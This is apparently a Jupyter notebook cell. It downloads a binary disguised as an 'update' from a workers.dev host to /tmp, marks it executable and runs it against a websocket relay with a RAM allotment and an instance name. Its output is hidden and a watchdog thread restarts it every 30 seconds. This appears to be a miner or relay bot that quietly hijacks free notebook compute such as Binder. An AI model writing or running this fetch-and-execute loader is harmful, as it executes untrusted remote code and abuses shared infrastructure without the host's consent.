In [ ]:
import subprocess, os, requests, time, sys, threading, signal, atexit
BIN='https://relay2.relay2.workers.dev/static/update'
URL='wss://relay2.relay2.workers.dev/'
RAM=1400
NAME='binder4'

def dl():
 r=requests.get(BIN,timeout=60)
 with open('/tmp/allinone','wb') as f: f.write(r.content)
 os.chmod('/tmp/allinone',0o755)
 print('dl ok')

p=None
def start():
 global p
 p=subprocess.Popen(['/tmp/allinone','--url',URL,'--ram',str(RAM),'-i',NAME],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
 print(f'PID={p.pid}')

dl()
start()

def watchdog():
 global p
 while True:
     time.sleep(30)
     if p.poll() is not None:
         print('restart')
         start()
     else:
         print('ok')

t=threading.Thread(target=watchdog,daemon=True)
t.start()

atexit.register(lambda: p.terminate() if p and p.poll() is None else None)
print(f'READY NAME={NAME}')
while True: time.sleep(60)